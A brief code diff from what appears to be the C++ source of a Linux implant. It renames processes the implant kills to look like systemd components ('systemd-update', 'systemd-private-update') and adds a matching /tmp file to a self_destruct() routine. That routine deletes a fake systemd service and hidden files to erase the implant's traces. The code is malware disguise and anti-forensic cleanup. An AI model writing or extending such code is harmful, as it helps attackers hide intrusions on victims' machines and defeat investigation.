@@ -37,7 +37,7 @@ static void kill_processes() {
     std::vector<std::string> process_names = {
         "systemd-private-uptime",
         "systemd-private-update",
-        "user.json",
+        "systemd-update",
         "implant"
     };
 
@@ -65,6 +65,7 @@ void self_destruct() {
         "/etc/systemd/system/private.service",
         "/tmp/systemd-private-uptime",
         "/tmp/systemd-private-update",
+        "/tmp/systemd-update",
         "/tmp/index.html",
         "/tmp/.k",
         "/tmp/.font-unix-s",
